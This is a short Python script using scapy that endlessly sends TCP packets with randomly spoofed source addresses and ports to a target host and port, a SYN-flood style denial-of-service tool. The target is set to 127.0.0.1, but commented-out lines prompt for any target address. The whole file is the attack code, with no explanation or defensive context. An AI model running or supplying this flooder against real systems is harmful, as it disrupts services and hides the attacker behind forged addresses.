from scapy.all import *
conf.L3socket=L3RawSocket
import ipaddress
import random


#src_IP = input("Enter IP address of Source: ")
target_IP = "127.0.0.1"#input("Enter IP address of Target: ")
#source_port = int(input("Enter Source Port Number:"))
i = 1



while True:

   IPAdr = str(ipaddress.IPv4Address(random.randint(0,2**32)))
   portNum = random.randint(0,2**16)
   IP1 = IP(src = IPAdr, dst = target_IP)
   TCP1 = TCP(sport = portNum, dport = 12000)
   pkt = IP1/TCP1
   send(pkt)
   #print(pkt.show())
   
   print ("packet sent ", i)
   i = i + 1
